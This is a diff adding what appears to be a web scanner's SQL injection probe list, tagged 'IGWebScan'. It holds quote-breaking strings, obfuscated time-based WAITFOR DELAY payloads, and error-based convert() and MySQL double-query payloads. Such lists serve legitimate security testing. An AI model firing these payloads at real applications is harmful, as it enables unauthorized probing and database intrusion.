@@ -1,0 +1,9 @@
+﻿';`--
+\xBF'")(
+1234
+1));DECLARE/**/@x/**/char(9);SET/**/@x=char(48)+char(58)+char(48)+char(58)+char(50)+char(53);WAITFOR/**/DELAY/**/@x--
+(select convert(int,CHAR(95)+CHAR(33)+CHAR(64)+CHAR(50)+CHAR(100)+CHAR(105)+CHAR(108)+CHAR(101)+CHAR(109)+CHAR(109)+CHAR(97)) FROM syscolumns)
+convert(int,(CHAR(95)%2BCHAR(33)%2BCHAR(64)%2BCHAR(50)%2BCHAR(100)%2BCHAR(105)%2BCHAR(108)%2BCHAR(101)%2BCHAR(109)%2BCHAR(109)%2BCHAR(97)))
+-1 or 1=1 and (select 1 and row(1,1)>(select count(*),concat(CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97)),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
+syscolumns WHERE 2>3;DECLARE/**/@x/**/char(9);SET/**/@x=char(48)+char(58)+char(48)+char(58)+char(50)+char(53);WAITFOR/**/DELAY/**/@x--
+IGWebScan
